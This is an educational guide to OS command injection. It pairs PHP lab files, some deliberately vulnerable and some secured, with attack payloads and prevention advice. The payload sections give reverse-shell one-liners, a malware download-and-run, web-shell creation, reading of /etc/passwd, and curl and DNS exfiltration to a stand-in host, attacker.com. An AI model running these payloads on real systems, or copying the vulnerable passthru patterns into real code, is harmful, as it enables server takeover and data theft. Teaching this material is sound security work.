# OS Command Injection - Complete Guide with Payloads

## Table of Contents
1. [Introduction](#introduction)
2. [Code Examples with Payloads](#code-examples-with-payloads)
3. [Common Injection Techniques](#common-injection-techniques)
4. [Prevention Methods](#prevention-methods)

---

## Introduction

OS Command Injection is a critical security vulnerability that allows attackers to execute arbitrary operating system commands on the server. This occurs when user input is improperly sanitized before being passed to system shell commands.

**Severity:** Critical (OWASP Top 10)

---

## Code Examples with Payloads

### 1. os-command-injection-4.php

#### What This Code Does:
- Uses `escapeshellarg()` to safely escape user input
- Executes `ls -lh` command with the provided path
- **Security Level:** SECURE (properly uses escapeshellarg)

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<pre>

<?php

if (isset($_REQUEST['path'])) {
    // Escape the user input IP safely, e.g., using escapeshellarg
    $cmd = "ls -lh " . escapeshellarg($_REQUEST['path']);
    
    // Uncomment the next line for debugging the exact command executed
    // echo $cmd . "<br />";
    
    // Execute the command and output the raw result
    passthru($cmd);
}

?>

</pre>

</body>
</html>
```

#### Attack Payloads:
```
# These payloads WILL NOT WORK due to escapeshellarg() protection
?path=/var/www; whoami
?path=/var/www | whoami
?path=/var/www && whoami
?path=`whoami`
?path=$(whoami)
```

#### Why It's Secure:
`escapeshellarg()` wraps the argument in single quotes and escapes any existing single quotes, preventing command injection.

---

### 2. os-command-injection-5.php

#### What This Code Does:
- Takes IP address from user input
- Executes ping command WITHOUT any validation
- **Security Level:** CRITICAL VULNERABILITY (No sanitization)

#### Code:
```php
<?php

if (isset($_REQUEST['ip'])) {
    
    // Dangerous: directly concatenating user input into shell command without sanitization
    $cmd = "ping -c 4 " . $_REQUEST['ip'];
    
    passthru($cmd);
    
} else {
    
    echo "Invalid IP Address";
    
}

?>
```

#### Attack Payloads:
```
# Command chaining
?ip=127.0.0.1; whoami
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 | whoami
?ip=127.0.0.1 || whoami

# Command substitution
?ip=127.0.0.1 `whoami`
?ip=127.0.0.1 $(whoami)

# Reading files
?ip=127.0.0.1; cat /etc/passwd
?ip=127.0.0.1 && cat /etc/passwd

# Reverse shell
?ip=127.0.0.1; nc -e /bin/sh attacker.com 4444
?ip=127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Create backdoor
?ip=127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Download malware
?ip=127.0.0.1; wget http://attacker.com/malware.sh -O /tmp/m.sh; bash /tmp/m.sh
```

---

### 3. os-command-injection-6.php

#### What This Code Does:
- Validates IP format using regex
- Still vulnerable due to weak regex pattern
- **Security Level:** VULNERABLE (Bypass possible)

#### Code:
```php
<?php

if (isset($_REQUEST['ip'])) {
    
    // Basic regex to check if the 'ip' parameter matches IPv4 format: four octets separated by dots, each 1-3 digits
    
    if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/m', $_REQUEST['ip'])) {
        
        $cmd = "ping -c 4 " . $_REQUEST['ip'];
        
        passthru($cmd);
        
    } else {
        
        echo "Invalid IP Address";
        
    }
    
}

?>
```

#### Attack Payloads:
```
# Newline injection (bypasses regex due to /m modifier)
?ip=192.168.1.1%0Awhoami
?ip=192.168.1.1%0A%0Dcat /etc/passwd

# If newline filtering exists, these won't work, but the regex allows invalid IPs:
?ip=999.999.999.999
```

#### Vulnerability:
The regex doesn't validate octet ranges (0-255) and the multiline modifier `/m` can be bypassed with newline characters.

---

### 4. os-command-injection-7.php

#### What This Code Does:
- HTML form to input IP address
- Uses same vulnerable regex validation
- **Security Level:** VULNERABLE

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<form action="os-command-injection-7.php" method="POST">
    IP Add:<input type="text" name="ipadd"><br />
    <input type="submit" name="ping" value="ping">
</form>

<pre>

<?php
if (isset($_REQUEST['ipadd'])) {
    // Basic regex for IPv4 format validation - does NOT validate octet ranges
    if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/m', $_REQUEST['ipadd'])) {
        // Vulnerable to OS command injection - user input concatenated directly into shell command
        $cmd = "ping -c 4 " . $_REQUEST['ipadd'];
        passthru($cmd);
    } else {
        echo "Invalid IP Address";
    }
}
?>

</pre>

</body>
</html>
```

#### Attack Payloads (POST):
```
# Using Burp Suite or curl to inject newlines
ipadd=192.168.1.1%0Awhoami

# Using curl
curl -X POST http://target.com/os-command-injection-7.php -d "ipadd=192.168.1.1%0Awhoami&ping=ping"
```

---

### 5. os-command-injection-8.php

#### What This Code Does:
- Identical to injection-7.php
- Form-based IP input with vulnerable validation
- **Security Level:** VULNERABLE

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<form action="os-command-injection-8.php" method="POST">
    IP Add:<input type="text" name="ipadd"><br />
    <input type="submit" name="ping" value="ping">
</form>

<pre>

<?php
if (isset($_REQUEST['ipadd'])) {
    // Basic regex for IPv4 format validation - does NOT validate octet ranges
    if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/m', $_REQUEST['ipadd'])) {
        // Vulnerable to OS command injection - user input concatenated directly into shell command
        $cmd = "ping -c 4 " . $_REQUEST['ipadd'];
        passthru($cmd);
    } else {
        echo "Invalid IP Address";
    }
}
?>

</pre>

</body>
</html>
```

#### Attack Payloads:
Same as os-command-injection-7.php

---

### 6. os-command-injection-9.php

#### What This Code Does:
- Dropdown menu with predefined commands
- NO validation - directly executes user input
- **Security Level:** CRITICAL VULNERABILITY

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<h1>OS Command Injection</h1>

<form action="os-command-injection9.php" method="POST">
    <label for="cmd">Run OS Command:</label>
    <select name="cmd" id="cmd">
        <option value="date">Date</option>
        <option value="free -h">Free</option>
        <option value="uptime">Uptime</option>
    </select>
    <br><br>
    <input type="submit" name="run" value="run">
</form>

<?php
if (isset($_POST['run'])) {
    // Directly executing selected command from user input without validation or escaping
    $cmd = $_POST['cmd'];
    passthru($cmd);
}
?>

</body>
</html>
```

#### Attack Payloads:
```
# Modify POST request to inject commands
cmd=date; whoami
cmd=date && cat /etc/passwd
cmd=date | nc attacker.com 4444 -e /bin/bash

# Using curl
curl -X POST http://target.com/os-command-injection-9.php -d "cmd=date; whoami&run=run"

# Create web shell
curl -X POST http://target.com/os-command-injection-9.php -d "cmd=echo '<?php system(\$_GET[\"c\"]); ?>' > backdoor.php&run=run"
```

---

### 7. os-command-injection-10.php

#### What This Code Does:
- Uses numeric IDs for command selection
- Validates input against whitelist array
- **Security Level:** SECURE (Proper whitelisting)

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<h1>OS Command Injection</h1>

<form action="os-command-injection-10.php" method="POST">
    <label for="cmd">Run OS Command:</label>
    <select name="cmd" id="cmd">
        <option value="1">Date</option>
        <option value="2">Free</option>
        <option value="3">Uptime</option>
    </select>
    <br><br>
    <input type="submit" name="run" value="run">
</form>

<?php
if (isset($_POST['run'])) {
    $cmd = $_POST['cmd'];
    $cmds = array('1', '2', '3');
    if (in_array($cmd, $cmds)) {
        if ($cmd === '1') {
            echo "<pre>";
            passthru('date');
            echo "</pre>";
        }
        
        if ($cmd === '2') {
            echo "<pre>";
            passthru('free -h');
            echo "</pre>";
        }
        
        if ($cmd === '3') {
            echo "<pre>";
            passthru('uptime');
            echo "</pre>";
        }
    }
}
?>

</body>
</html>
```

#### Attack Payloads:
```
# These will NOT work due to proper whitelisting
cmd=1; whoami
cmd=4
cmd=date

# No user input reaches the shell - commands are hardcoded
```

#### Why It's Secure:
User input never reaches the shell command. Only predefined, hardcoded commands are executed.

---

### 8. os-command-injection-11.php

#### What This Code Does:
- Uses switch statement for command selection
- Same security approach as injection-10.php
- **Security Level:** SECURE (Proper implementation)

#### Code:
```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<h1>OS Command Injection</h1>

<form action="os-command-injection-11.php" method="POST">
    <label for="cars">Run OS Command:</label>
    <select name="cmd" id="cmd">
        <option value="1">Date</option>
        <option value="2">Free</option>
        <option value="3">Uptime</option>
    </select>
    <br><br>
    <input type="submit" name="run" value="run">
</form>

<?php

if (isset($_POST['run'])) {
    
    $cmd = $_POST['cmd'];
    
    switch ($cmd) {
        case '1':
            echo "<pre>";
            passthru('date');
            echo "</pre>";
            break;
            
        case '2':
            echo "<pre>";
            passthru('free -h');
            echo "</pre>";
            break;
            
        case '3':
            echo "<pre>";
            passthru('uptime');
            echo "</pre>";
            break;
            
        default:
            echo "Invalid Cmd";
            break;
    }
}

?>

</body>
</html>
```

#### Attack Payloads:
```
# These will NOT work
cmd=1; whoami
cmd=1 && cat /etc/passwd

# Switch statement ensures only valid cases execute predefined commands
```

#### Why It's Secure:
Switch statement with hardcoded commands prevents injection. User input only determines which predefined command runs.

---

## Common Injection Techniques

### 1. Command Chaining
```bash
; command    # Execute regardless of previous command
&& command   # Execute if previous succeeds
|| command   # Execute if previous fails
| command    # Pipe output to next command
```

### 2. Command Substitution
```bash
`command`       # Backticks
$(command)      # Dollar parentheses
```

### 3. Newline Injection
```bash
%0A command     # URL encoded newline
%0D%0A command  # URL encoded CRLF
\n command      # Literal newline
```

### 4. Advanced Payloads
```bash
# Time-based detection
; sleep 10
&& ping -c 10 127.0.0.1

# Blind command injection (DNS exfiltration)
; nslookup $(whoami).attacker.com

# Out-of-band data exfiltration
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
```

---

## Prevention Methods

### 1. **Input Validation (Best)**
```php
// Whitelist approach
$allowed_commands = ['date', 'uptime', 'free'];
if (in_array($user_input, $allowed_commands)) {
    passthru($user_input);
}
```

### 2. **Use escapeshellarg() and escapeshellcmd()**
```php
// For arguments
$safe_arg = escapeshellarg($user_input);
passthru("command $safe_arg");

// For commands (use with caution)
$safe_cmd = escapeshellcmd($user_input);
```

### 3. **Avoid Shell Execution Functions**
Instead of `passthru()`, `shell_exec()`, `system()`, `exec()`:
```php
// Use PHP native functions
file_get_contents();
file_put_contents();
unlink();
```

### 4. **Use Parameterized APIs**
```php
// Instead of shell commands
$output = proc_open('command', $descriptors, $pipes);
```

### 5. **Proper Regex Validation**
```php
// Better IP validation
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // Valid IP
}
```

### 6. **Principle of Least Privilege**
- Run web applications with minimal permissions
- Use chroot jails or containers
- Disable dangerous PHP functions in php.ini:
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

---

## Security Testing Checklist

- [ ] All user inputs are validated against whitelist
- [ ] `escapeshellarg()` used for all arguments
- [ ] No direct concatenation of user input to commands
- [ ] Shell execution functions disabled if not needed
- [ ] Web server runs with minimal privileges
- [ ] Input validation includes regex without `/m` modifier
- [ ] Error messages don't reveal system information
- [ ] Logging implemented for command execution
- [ ] Regular security audits performed

---

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PHP Security Guide](https://www.php.net/manual/en/security.php)

---

**Disclaimer:** This document is for educational purposes only. Unauthorized testing of systems you don't own is illegal.